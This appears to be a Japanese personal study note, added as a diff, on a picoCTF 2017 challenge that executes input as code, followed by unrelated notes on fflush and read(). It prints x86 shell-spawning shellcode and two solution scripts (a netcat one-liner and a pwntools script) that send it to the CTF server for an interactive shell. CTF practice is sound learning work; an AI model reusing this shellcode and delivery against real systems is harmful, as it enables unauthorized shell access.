@@ -1,0 +1,96 @@
+一番重要になるのは以下の3行
+    char * stuff = (char *)mmap(NULL, AMOUNT_OF_STUFF, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+    ・・・
+    void (*func)() = (void (*)())stuff;
+    func();
+
+このうち「void (*func)() = (void (*)())stuff;」の部分は関数ポインタになっており、
+stuffで格納したメモリの位置をfuncに格納し、その後funcを実行する形になっている。
+→つまり、stuffに格納したものは、実行可能な状態にしなくてはいけない。
+→だからアセンブラ言語で値を渡してやる必要がある。
+
+http://piyopiyo-blog.hatenablog.com/entry/2018/01/01/190503
+読み込んだバイト列をそのまま関数として実行するみたいなので、シェルを起動するコードを
+標準入力として渡してやればいいですね。
+ただ、バイト列をそのまま渡さなきゃいけないので、catコマンドで渡してあげます。
+
+なんでcat -を入れるの？については以下を参照
+https://qiita.com/bami3/items/d67152d19aa8ac2d47de
+http://twinbird-htn.hatenablog.com/entry/2016/06/03/125239
+
+
+shellにアクセスするアセンブラ言語
+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
+"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
+"\x80"
+
+答えのコード①##########################################################
+(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; cat -) | nc shell2017.picoctf.com 39307
+
+##########################################################
+
+答えのコード②##########################################################
+from pwn import *
+
+SHELLCODE = b"\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
+
+HOST, PORT = "shell2017.picoctf.com", 49381
+r = remote(HOST, PORT)
+
+print(r.recv().decode('utf-8'))
+payload = SHELLCODE
+
+r.sendline(payload)
+r.interactive()
+r.close()
+
+##########################################################
+
+# fflush関数サンプルプログラム
+fflush 関数を使用してバッファをフラッシュするサンプルプログラムを以下に示します．
+以下のサンプルプログラムは setbuf 関数を用いて標準出力をバッファリングしています．
+そのため，printf 関数を使用してもすぐには表示されません．fflush を用いてバッファをフラッシュすることで書き込まれます．
+/* header files */
+#include <stdio.h>
+#include <stdlib.h>
+
+/* functions */
+void MySleep(int n);
+
+/* main */
+int main(void) {
+    char buf[BUFSIZ];
+
+    /* 標準出力を完全バッファリングする */
+    setbuf(stdout, buf);
+
+    /* Snoopyの出力 */
+    printf("Snoopy\n"); /* <-- "Snoopy\n"がバッファリングされる */
+
+    /* 時間稼ぎ */
+    MySleep(100000);
+
+    /* バッファのフラッシュ */
+    fflush(stdout); /* <-- この時点で"Snoopy\n"が出力される" */
+
+    return EXIT_SUCCESS;
+}
+
+/* 時間かせぎ */
+void MySleep(int n) {
+    int i;
+    for ( i = 0; i < n * 5000; i++ ); 
+}
+
+# read関数
+ファイルからのデータ読み込み
+int read(int handle, void *buf, unsigned n);
+
+【パラメータの型と説明】
+    パラメータ	説明
+    int handle	ファイルハンドル
+    void *buf	データを格納するアドレス
+    unsigned n	データの大きさ
+
+今回のケースだとreadしている部分で入力された内容を実行している。
+→前半部分を読み込めてshellが起動していれば、「cat -」はそのまま実行できるってことか？
